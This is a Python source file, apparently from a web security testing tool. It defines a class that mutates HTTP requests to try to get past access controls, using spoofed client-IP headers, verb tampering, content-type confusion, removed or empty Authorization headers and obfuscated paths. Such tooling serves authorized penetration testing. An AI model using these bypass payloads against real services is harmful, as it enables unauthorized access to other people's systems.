"""Bypass techniques."""

from typing import Dict, Any, List


class BypassEngine:
    """Engine for generating authentication and authorization bypass techniques."""

    def __init__(self):
        """Initialize bypass engine with all available techniques."""
        self.techniques = [
            self.header_poisoning,
            self.verb_tampering,
            self.content_type_confusion,
            self.auth_bypass,
            self.path_obfuscation
        ]

    def generate_bypasses(self, original_request: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Generate modified requests to bypass controls."""
        bypasses = []
        for technique in self.techniques:
            bypasses.extend(technique(original_request))
        return bypasses

    def header_poisoning(self, request: Dict[str, Any]) -> List[Dict[str, Any]]:
        headers = [
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Client-IP": "127.0.0.1"},
            {"X-Remote-IP": "127.0.0.1"},
            {"X-Remote-Addr": "127.0.0.1"},
            {"Client-IP": "127.0.0.1"},
            {"True-Client-IP": "127.0.0.1"},
            {"Cluster-Client-IP": "127.0.0.1"}
        ]
        results = []
        for h in headers:
            new_req = request.copy()
            new_req['headers'] = new_req.get('headers', {}).copy()
            new_req['headers'].update(h)
            results.append(new_req)
        return results

    def verb_tampering(self, request: Dict[str, Any]) -> List[Dict[str, Any]]:
        verbs = ["GET", "POST", "HEAD", "OPTIONS", "TRACE", "PUT", "DELETE", "PROPFIND", "PATCH"]
        results = []
        current_method = request.get('method', 'GET')
        for verb in verbs:
            if verb != current_method:
                new_req = request.copy()
                new_req['method'] = verb
                results.append(new_req)
        return results

    def content_type_confusion(self, request: Dict[str, Any]) -> List[Dict[str, Any]]:
        types = [
            "application/json",
            "application/xml",
            "application/x-www-form-urlencoded",
            "multipart/form-data",
            "text/plain",
            "application/json;charset=UTF-7"
        ]
        results = []
        for t in types:
            new_req = request.copy()
            new_req['headers'] = new_req.get('headers', {}).copy()
            new_req['headers']['Content-Type'] = t
            results.append(new_req)
        return results

    def auth_bypass(self, request: Dict[str, Any]) -> List[Dict[str, Any]]:
        # Remove auth headers or modify them
        results = []

        # 1. Remove Authorization
        req_no_auth = request.copy()
        req_no_auth['headers'] = req_no_auth.get('headers', {}).copy()
        if 'Authorization' in req_no_auth['headers']:
            del req_no_auth['headers']['Authorization']
            results.append(req_no_auth)

        # 2. Empty Bearer
        if 'Authorization' in request.get('headers', {}):
             req_empty = request.copy()
             req_empty['headers'] = req_empty.get('headers', {}).copy()
             req_empty['headers']['Authorization'] = "Bearer "
             results.append(req_empty)

        return results

    def path_obfuscation(self, request: Dict[str, Any]) -> List[Dict[str, Any]]:
        path = request.get('path', '')
        if not path:
             return []

        obfuscations = [
            path + "/",
            path + "/.",
            "//" + path.lstrip("/"),
            path.replace("/", "%2f"),
            path + "%00"
        ]

        results = []
        for obs in obfuscations:
             new_req = request.copy()
             new_req['path'] = obs
             results.append(new_req)
        return results
